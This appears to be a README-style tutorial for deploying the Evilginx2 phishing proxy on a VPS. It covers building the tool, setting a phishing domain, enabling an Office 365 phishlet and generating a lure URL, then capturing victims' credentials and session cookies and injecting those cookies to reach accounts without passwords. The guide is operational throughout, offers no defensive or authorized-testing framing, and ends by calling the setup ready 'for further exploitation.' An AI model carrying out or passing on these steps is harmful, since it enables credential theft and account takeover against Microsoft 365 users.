# ⚙️ Step 1: Prepare the VPS Environment

Before installing Evilginx, we need to ensure the VPS has all necessary tools and dependencies installed. This includes utilities like `wget` and the Go programming language.
```bash
sudo apt update 
sudo apt install wget -y
```
---

## 🔧 Installing Required Tools

First, update your VPS package list and install essential tools for the setup:

- `wget` for downloading files  
- `git` and `make` for building Evilginx from source
```bash
wget https://golang.org/dl/go1.17.linux-amd64.tar.gz
```
---

## 🏗️ Installing Go (Golang)

To build Evilginx, Go must be installed on the system. The installation involves:

- Downloading the Go binary archive from the official website  
- Extracting it to `/usr/local/`  
- Configuring the system `PATH` to include Go binaries

This setup allows you to compile Evilginx without errors.
```bash
sudo tar -zxvf go1.17.linux-amd64.tar.gz -C /usr/local/
```
```bash
echo "export PATH=/usr/local/go/bin:${PATH}" | sudo tee /etc/profile.d/go.sh 
source /etc/profile.d/go.sh
```
---

# 🕸️ Step 2: Clone and Build Evilginx

With the environment ready, clone the Evilginx source code from its GitHub repository and compile it.

---

## 📥 Cloning the Repository

Use `git` to clone the Evilginx2 repository to your VPS:

- Repository URL: `https://github.com/BakkerJan/evilginx2.git`
```bash
sudo apt-get -y install git make 
git clone https://github.com/BakkerJan/evilginx2.git 
cd evilginx2 
make
```
---

## ⚙️ Building the Project

Navigate into the cloned directory and use `make` to compile the source code into a working binary.

---

# 🚀 Step 3: Install and Launch Evilginx

Once built, launch the Evilginx service to begin configuration.
```bash 
sudo evilginx
```
---

# 🌐 Step 4: Configure Domain and IP

Set your phishing domain and the VPS IP address within Evilginx. For example:

- Domain: `evilginxtest.shop`  
- IP: `52.144.47.242`

Apply a blacklist rule to block unauthorized requests for better security.
```bash
config domain <yourdomain> 
config ip <yourIP> 
blacklist unauth
```
---

# 🏷️ Step 5: Enable the Office 365 Phishlet

Configure the Office 365 phishlet to use your custom domain and enable it.
```bash
phishlets hostname o365 <yourdomain> 
phishlets enable o365
```
---

## ⚠️ SSL/TLS Setup Notes

If you encounter SSL/TLS errors when enabling the phishlet:

- This usually means DNS propagation is incomplete  
- Evilginx attempts to obtain an SSL certificate via Let’s Encrypt automatically  
- Retry the enable command periodically until it succeeds

---

# 🎣 Step 6: Create and Configure the Phishing Lure

Create a lure linked to the Office 365 phishlet and set a redirect URL users will be sent to after submitting credentials.
```bash
lures create o365 
lures edit 0 redirect_url https://portal.office.com 
lures get-url 0
```
---

# 👀 Step 7: Phishing Experience and Session Capture

When a user visits the lure URL, they see a page identical to Microsoft’s login screen.

![Microsoft Login Page](https://github.com/user-attachments/assets/dcf20d05-6fe2-40ff-97de-4fdee2eb6d06)

After submitting credentials, Evilginx captures them transparently.

![Credentials Captured](https://github.com/user-attachments/assets/b8fb9489-1cb8-4d6c-a3fc-38e4b8ee562f)

---

# 🗝️ Step 8: Extract and Use Session Cookies

Once authentication completes, Evilginx captures valid session cookies.

View active sessions with the appropriate command and extract session tokens.

![Session Cookies](https://github.com/user-attachments/assets/8f293e48-b323-4167-8566-2102eec0da22)

---

## 🔓 Using Captured Sessions

By injecting these cookies into a browser visiting the legitimate site, you gain authenticated access without knowing the victim’s password.

---

# 🎉 Conclusion

Your Evilginx phishing setup is now fully operational, ready to capture credentials and session cookies for further exploitation.
